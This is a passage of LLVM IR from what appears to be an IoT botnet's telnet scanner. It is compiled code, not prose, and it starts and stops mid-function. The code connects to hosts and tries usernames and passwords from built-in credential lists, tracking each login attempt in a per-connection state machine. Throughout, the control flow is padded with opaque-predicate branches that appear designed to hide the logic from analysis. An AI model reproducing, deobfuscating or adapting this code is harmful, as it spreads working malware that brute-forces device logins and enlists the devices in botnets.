  %312 = load i32, i32* %6, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 1
  %316 = load i32, i32* %315, align 4
  %317 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %318 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %317, i32 0, i32 0
  store i32 %316, i32* %318, align 4
  %319 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %320 = load i32, i32* %6, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  store i32 %319, i32* %323, align 16
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = icmp eq i32 %328, -1
  br i1 %329, label %330, label %331

; <label>:330:                                    ; preds = %306
  br label %1914

; <label>:331:                                    ; preds = %306
  %332 = load i32, i32* @x.71
  %333 = load i32, i32* @y.72
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %331
  %340 = load i32, i32* %6, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 0
  %344 = load i32, i32* %343, align 16
  %345 = load i32, i32* %6, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = call i32 (i32, i32, ...) @fcntl(i32 %349, i32 3, i8* null)
  %351 = or i32 %350, 2048
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %344, i32 4, i32 %351)
  %353 = load i32, i32* %6, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 16
  %358 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %359 = call i32 @connect(i32 %357, %struct.sockaddr* %358, i32 16)
  %360 = icmp eq i32 %359, -1
  %361 = load i32, i32* @x.71
  %362 = load i32, i32* @y.72
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart248, label %originalBB37alteredBB

originalBBpart248:                                ; preds = %originalBB37
  br i1 %360, label %369, label %377

; <label>:369:                                    ; preds = %originalBBpart248
  %370 = call i32* @__errno_location() #10
  %371 = load i32, i32* %370, align 4
  %372 = icmp ne i32 %371, 115
  br i1 %372, label %373, label %377

; <label>:373:                                    ; preds = %369
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %375
  call void @reset_telstate(%struct.telstate_t* %376)
  br label %397

; <label>:377:                                    ; preds = %369, %originalBBpart248
  %378 = load i32, i32* @x.71
  %379 = load i32, i32* @y.72
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %377
  %386 = load i32, i32* %6, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %387
  call void @advance_telstate(%struct.telstate_t* %388, i32 1)
  %389 = load i32, i32* @x.71
  %390 = load i32, i32* @y.72
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %397

; <label>:397:                                    ; preds = %originalBBpart252, %373
  br label %1913

; <label>:398:                                    ; preds = %originalBBpart218
  br label %399

; <label>:399:                                    ; preds = %398
  %400 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %401 = getelementptr inbounds [16 x i64], [16 x i64]* %400, i64 0, i64 0
  %402 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %401) #5, !srcloc !5
  %403 = extractvalue { i64, i64* } %402, 0
  %404 = extractvalue { i64, i64* } %402, 1
  %405 = trunc i64 %403 to i32
  store i32 %405, i32* %21, align 4
  %406 = ptrtoint i64* %404 to i64
  %407 = trunc i64 %406 to i32
  store i32 %407, i32* %22, align 4
  br label %408

; <label>:408:                                    ; preds = %399
  br label %409

; <label>:409:                                    ; preds = %408
  %410 = load i32, i32* %6, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 16
  %415 = srem i32 %414, 64
  %416 = zext i32 %415 to i64
  %417 = shl i64 1, %416
  %418 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %419 = load i32, i32* %6, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = sdiv i32 %423, 64
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds [16 x i64], [16 x i64]* %418, i64 0, i64 %425
  %427 = load i64, i64* %426, align 8
  %428 = or i64 %427, %417
  store i64 %428, i64* %426, align 8
  %429 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %429, align 8
  %430 = load i32, i32* %3, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %431, i64* %432, align 8
  %433 = load i32, i32* %6, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 16
  %438 = add nsw i32 %437, 1
  %439 = call i32 @select(i32 %438, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %439, i32* %7, align 4
  %440 = load i32, i32* %7, align 4
  %441 = icmp eq i32 %440, 1
  br i1 %441, label %442, label %510

; <label>:442:                                    ; preds = %409
  %443 = load i32, i32* %6, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 7
  store i32 0, i32* %446, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %447 = load i32, i32* %6, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 16
  %452 = bitcast i32* %15 to i8*
  %453 = call i32 @getsockopt(i32 %451, i32 1, i32 4, i8* %452, i32* %14) #5
  %454 = load i32, i32* %15, align 4
  %455 = icmp ne i32 %454, 0
  br i1 %455, label %456, label %460

; <label>:456:                                    ; preds = %442
  %457 = load i32, i32* %6, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %458
  call void @reset_telstate(%struct.telstate_t* %459)
  br label %493

; <label>:460:                                    ; preds = %442
  %461 = load i32, i32* @x.71
  %462 = load i32, i32* @y.72
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %460
  %469 = load i32, i32* %6, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 0
  %473 = load i32, i32* %472, align 16
  %474 = load i32, i32* %6, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 0
  %478 = load i32, i32* %477, align 16
  %479 = call i32 (i32, i32, ...) @fcntl(i32 %478, i32 3, i8* null)
  %480 = and i32 %479, -2049
  %481 = call i32 (i32, i32, ...) @fcntl(i32 %473, i32 4, i32 %480)
  %482 = load i32, i32* %6, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %483
  call void @advance_telstate(%struct.telstate_t* %484, i32 2)
  %485 = load i32, i32* @x.71
  %486 = load i32, i32* @y.72
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart259, label %originalBB54alteredBB

originalBBpart259:                                ; preds = %originalBB54
  br label %493

; <label>:493:                                    ; preds = %originalBBpart259, %456
  %494 = load i32, i32* @x.71
  %495 = load i32, i32* @y.72
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %493
  %502 = load i32, i32* @x.71
  %503 = load i32, i32* @y.72
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %1914

; <label>:510:                                    ; preds = %409
  %511 = load i32, i32* @x.71
  %512 = load i32, i32* @y.72
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %510
  %519 = load i32, i32* %7, align 4
  %520 = icmp eq i32 %519, -1
  %521 = load i32, i32* @x.71
  %522 = load i32, i32* @y.72
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %520, label %529, label %533

; <label>:529:                                    ; preds = %originalBBpart267
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %531
  call void @reset_telstate(%struct.telstate_t* %532)
  br label %1914

; <label>:533:                                    ; preds = %originalBBpart267
  br label %534

; <label>:534:                                    ; preds = %533
  %535 = load i32, i32* %6, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 7
  %539 = load i32, i32* %538, align 16
  %540 = add i32 %539, 7
  %541 = zext i32 %540 to i64
  %542 = call i64 @time(i64* null) #5
  %543 = icmp slt i64 %541, %542
  br i1 %543, label %544, label %548

; <label>:544:                                    ; preds = %534
  %545 = load i32, i32* %6, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %546
  call void @reset_telstate(%struct.telstate_t* %547)
  br label %548

; <label>:548:                                    ; preds = %544, %534
  %549 = load i32, i32* @x.71
  %550 = load i32, i32* @y.72
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %548
  %557 = load i32, i32* @x.71
  %558 = load i32, i32* @y.72
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %1913

; <label>:565:                                    ; preds = %originalBBpart218
  %566 = load i32, i32* @x.71
  %567 = load i32, i32* @y.72
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %565
  %574 = load i32, i32* %6, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 0
  %578 = load i32, i32* %577, align 16
  %579 = load i32, i32* %3, align 4
  %580 = load i32, i32* %6, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 9
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @read_until_response(i32 %578, i32 %579, i8* %584, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %586 = icmp ne i32 %585, 0
  %587 = load i32, i32* @x.71
  %588 = load i32, i32* @y.72
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %586, label %595, label %634

; <label>:595:                                    ; preds = %originalBBpart275
  %596 = call i64 @time(i64* null) #5
  %597 = trunc i64 %596 to i32
  %598 = load i32, i32* %6, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 7
  store i32 %597, i32* %601, align 16
  %602 = load i32, i32* %6, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 9
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @contains_fail(i8* %606)
  %608 = icmp ne i32 %607, 0
  br i1 %608, label %609, label %629

; <label>:609:                                    ; preds = %595
  %610 = load i32, i32* @x.71
  %611 = load i32, i32* @y.72
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %609
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %619
  call void @advance_telstate(%struct.telstate_t* %620, i32 0)
  %621 = load i32, i32* @x.71
  %622 = load i32, i32* @y.72
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %633

; <label>:629:                                    ; preds = %595
  %630 = load i32, i32* %6, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %631
  call void @advance_telstate(%struct.telstate_t* %632, i32 3)
  br label %633

; <label>:633:                                    ; preds = %629, %originalBBpart279
  br label %1914

; <label>:634:                                    ; preds = %originalBBpart275
  %635 = load i32, i32* @x.71
  %636 = load i32, i32* @y.72
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %634
  %643 = load i32, i32* %6, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  %647 = load i32, i32* %646, align 16
  %648 = add i32 %647, 7
  %649 = zext i32 %648 to i64
  %650 = call i64 @time(i64* null) #5
  %651 = icmp slt i64 %649, %650
  %652 = load i32, i32* @x.71
  %653 = load i32, i32* @y.72
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart290, label %originalBB81alteredBB

originalBBpart290:                                ; preds = %originalBB81
  br i1 %651, label %660, label %664

; <label>:660:                                    ; preds = %originalBBpart290
  %661 = load i32, i32* %6, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %662
  call void @reset_telstate(%struct.telstate_t* %663)
  br label %664

; <label>:664:                                    ; preds = %660, %originalBBpart290
  br label %1913

; <label>:665:                                    ; preds = %originalBBpart218
  %666 = load i32, i32* @x.71
  %667 = load i32, i32* @y.72
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %665
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 16
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 4
  %683 = load i8, i8* %682, align 2
  %684 = zext i8 %683 to i64
  %685 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %684
  %686 = load i8*, i8** %685, align 8
  %687 = call i32 (i32, i8*, ...) @sockprintf(i32 %678, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %686)
  %688 = icmp slt i32 %687, 0
  %689 = load i32, i32* @x.71
  %690 = load i32, i32* @y.72
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %688, label %697, label %717

; <label>:697:                                    ; preds = %originalBBpart294
  %698 = load i32, i32* @x.71
  %699 = load i32, i32* @y.72
  %700 = sub i32 %698, 1
  %701 = mul i32 %698, %700
  %702 = urem i32 %701, 2
  %703 = icmp eq i32 %702, 0
  %704 = icmp slt i32 %699, 10
  %705 = or i1 %703, %704
  br i1 %705, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %697
  %706 = load i32, i32* %6, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %707
  call void @reset_telstate(%struct.telstate_t* %708)
  %709 = load i32, i32* @x.71
  %710 = load i32, i32* @y.72
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1914

; <label>:717:                                    ; preds = %originalBBpart294
  %718 = load i32, i32* %6, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %719
  call void @advance_telstate(%struct.telstate_t* %720, i32 4)
  br label %1913

; <label>:721:                                    ; preds = %originalBBpart218
  %722 = load i32, i32* %6, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 0
  %726 = load i32, i32* %725, align 16
  %727 = load i32, i32* %3, align 4
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 9
  %732 = load i8*, i8** %731, align 8
  %733 = call i32 @read_until_response(i32 %726, i32 %727, i8* %732, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %734 = icmp ne i32 %733, 0
  br i1 %734, label %735, label %774

; <label>:735:                                    ; preds = %721
  %736 = load i32, i32* @x.71
  %737 = load i32, i32* @y.72
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %735
  %744 = call i64 @time(i64* null) #5
  %745 = trunc i64 %744 to i32
  %746 = load i32, i32* %6, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 7
  store i32 %745, i32* %749, align 16
  %750 = load i32, i32* %6, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %751
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %752, i32 0, i32 9
  %754 = load i8*, i8** %753, align 8
  %755 = call i32 @contains_fail(i8* %754)
  %756 = icmp ne i32 %755, 0
  %757 = load i32, i32* @x.71
  %758 = load i32, i32* @y.72
  %759 = sub i32 %757, 1
  %760 = mul i32 %757, %759
  %761 = urem i32 %760, 2
  %762 = icmp eq i32 %761, 0
  %763 = icmp slt i32 %758, 10
  %764 = or i1 %762, %763
  br i1 %764, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %756, label %765, label %769

; <label>:765:                                    ; preds = %originalBBpart2102
  %766 = load i32, i32* %6, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %767
  call void @advance_telstate(%struct.telstate_t* %768, i32 0)
  br label %773

; <label>:769:                                    ; preds = %originalBBpart2102
  %770 = load i32, i32* %6, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %771
  call void @advance_telstate(%struct.telstate_t* %772, i32 5)
  br label %773

; <label>:773:                                    ; preds = %769, %765
  br label %1914

; <label>:774:                                    ; preds = %721
  %775 = load i32, i32* %6, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 7
  %779 = load i32, i32* %778, align 16
  %780 = add i32 %779, 7
  %781 = zext i32 %780 to i64
  %782 = call i64 @time(i64* null) #5
  %783 = icmp slt i64 %781, %782
  br i1 %783, label %784, label %788

; <label>:784:                                    ; preds = %774
  %785 = load i32, i32* %6, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %786
  call void @reset_telstate(%struct.telstate_t* %787)
  br label %788

; <label>:788:                                    ; preds = %784, %774
  br label %1913

; <label>:789:                                    ; preds = %originalBBpart218
  %790 = load i32, i32* %6, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 16
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 5
  %799 = load i8, i8* %798, align 1
  %800 = zext i8 %799 to i64
  %801 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %800
  %802 = load i8*, i8** %801, align 8
  %803 = call i32 (i32, i8*, ...) @sockprintf(i32 %794, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %802)
  %804 = icmp slt i32 %803, 0
  br i1 %804, label %805, label %825

; <label>:805:                                    ; preds = %789
  %806 = load i32, i32* @x.71
  %807 = load i32, i32* @y.72
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %805
  %814 = load i32, i32* %6, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %815
  call void @reset_telstate(%struct.telstate_t* %816)
  %817 = load i32, i32* @x.71
  %818 = load i32, i32* @y.72
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1914

; <label>:825:                                    ; preds = %789
  %826 = load i32, i32* @x.71
  %827 = load i32, i32* @y.72
  %828 = sub i32 %826, 1
  %829 = mul i32 %826, %828
  %830 = urem i32 %829, 2
  %831 = icmp eq i32 %830, 0
  %832 = icmp slt i32 %827, 10
  %833 = or i1 %831, %832
  br i1 %833, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %825
  %834 = load i32, i32* %6, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %835
  call void @advance_telstate(%struct.telstate_t* %836, i32 6)
  %837 = load i32, i32* @x.71
  %838 = load i32, i32* @y.72
  %839 = sub i32 %837, 1
  %840 = mul i32 %837, %839
  %841 = urem i32 %840, 2
  %842 = icmp eq i32 %841, 0
  %843 = icmp slt i32 %838, 10
  %844 = or i1 %842, %843
  br i1 %844, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %1913

; <label>:845:                                    ; preds = %originalBBpart218
